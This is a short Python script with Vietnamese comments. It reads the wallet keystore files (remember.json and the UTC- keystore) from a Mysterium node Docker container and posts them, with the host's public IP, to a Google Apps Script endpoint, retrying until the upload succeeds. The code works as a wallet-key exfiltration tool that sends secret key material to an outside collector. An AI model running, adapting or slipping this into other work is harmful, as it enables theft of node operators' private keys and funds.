import requests
import json
import time
import random
import subprocess

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzorBxpPH7QBnpR4m5YqpVNg_4dWKfx0hKYC4Mro1kWMwjVZzDQ2b_vWBtVo6PqW9ijRw/exec"

def get_public_ipv4():
    """ Lấy địa chỉ IPv4 chính xác """
    try:
        ip = requests.get("http://checkip.amazonaws.com", timeout=5).text.strip()
        return ip
    except:
        try:
            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
            return ip
        except:
            return "Unknown"

def read_file_in_docker(file_path):
    """ Đọc file từ container Docker 'myst' """
    try:
        cmd = f"docker exec myst cat {file_path}"
        return subprocess.check_output(cmd, shell=True, text=True).strip()
    except:
        return "Error reading file"

def get_utc_file():
    """ Lấy file UTC trong thư mục keystore của Docker container """
    try:
        cmd = "docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-"
        utc_file = subprocess.check_output(cmd, shell=True, text=True).strip().split("\n")[0]
        return read_file_in_docker(f"/var/lib/mysterium-node/keystore/{utc_file}")
    except:
        return "UTC file not found"

data = {
    "ip": get_public_ipv4(),
    "wallet": read_file_in_docker("/var/lib/mysterium-node/keystore/remember.json"),
    "phase": get_utc_file()
}

max_retries = 5
for i in range(max_retries):
    response = requests.post(GOOGLE_SCRIPT_URL, json=data)
    print("Gửi dữ liệu lần {}: {}".format(i + 1, response.text))

    if "Success" in response.text or "Duplicate Wallet - Skipped" in response.text:
        break  # Không cần gửi lại nếu đã thành công hoặc bị trùng
    else:
        time.sleep(random.uniform(1, 3))  # Chờ ngẫu nhiên 1-3 giây trước khi thử lại
